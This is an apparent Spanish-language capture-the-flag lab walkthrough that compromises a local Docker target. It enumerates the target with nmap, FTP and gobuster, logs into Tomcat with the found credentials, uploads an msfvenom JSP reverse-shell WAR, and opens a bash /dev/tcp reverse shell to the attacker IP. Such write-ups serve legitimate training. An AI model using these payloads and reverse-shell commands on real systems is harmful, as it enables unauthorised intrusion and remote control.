Desplegamos el contenedor:

```Bash
bash auto_deploy.sh pn.tar
```

![Pasted image 20250203124154](https://github.com/user-attachments/assets/5c2ff673-c307-4b2b-999f-7304362f0199)

Escaneamos la IP:

```Bash
nmap -sV -sC -sS -T 5 -n -Pn -p- 172.17.0.2
```

![Pasted image 20250203124223](https://github.com/user-attachments/assets/da475089-bcdd-438e-913c-488a8a3bb0a5)

Nos conectamos con **FTP**:

```Bash
ftp 172.17.0.2
```

![Pasted image 20250203124312](https://github.com/user-attachments/assets/ee8f0666-58ff-4578-80c7-036557fcf5c2)

```Bash
anonymous
```

![Pasted image 20250203124328](https://github.com/user-attachments/assets/92527238-17ca-494b-951c-ef3c8af0a9d5)

```Bash
'blank'
```

![Pasted image 20250203124340](https://github.com/user-attachments/assets/a4100623-3c73-4303-a895-fb0a204b11a1)

```Bash
ls
```

![Pasted image 20250203124409](https://github.com/user-attachments/assets/e16a42b2-9c7c-4258-8c1e-3f6e9a751557)

```Bash
get tomcat.txt
```

![Pasted image 20250203124434](https://github.com/user-attachments/assets/7cc3f2ad-beca-4453-89b6-5bebb273f8e4)

```Bash
cat tomcat.txt
```

![Pasted image 20250203124645](https://github.com/user-attachments/assets/07ac7123-592e-4c5b-a422-e27214918a87)

Hacemos **Fuzzing**:

```Bash
gobuster dir -u http://172.17.0.2:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,py,sh,txt
```

![Pasted image 20250204152455](https://github.com/user-attachments/assets/13ed0ee4-214a-48fc-9753-a3bf67bf1571)

Nos metemos en la web:

![[Pasted image 20250203124745.png]]

![[Pasted image 20250203125031.png]]


![[Pasted image 20250203124932.png]]



tomcat: s3cr3t

![[Pasted image 20250203125055.png]]

![[Pasted image 20250204144739.png]]

Creamos payload para subir:

```Bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war -o shell.war
```

![[Pasted image 20250204151401.png]]

Lo subimos:

![[Pasted image 20250204150907.png]]

![[Pasted image 20250204150933.png]]

Nos ponemos a la escucha con **netcat**:

```Bash
nc -lnvp 4444
```

![[Pasted image 20250204151015.png]]

Nos ponemos otra:

```Bash
nc -lnvp 443
```

![[Pasted image 20250204152406.png]]

Pinchamos en la shell subida:

![[Pasted image 20250204152912.png]]

Miramos en la shell:

![[Pasted image 20250204152129.png]]

Nos la mandamos a la otra shell:

```Bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

![[Pasted image 20250204152103.png]]

Miramos la otra shell:

![[Pasted image 20250204152256.png]]

```Bash
whoami
```

![[Pasted image 20250204152315.png]]
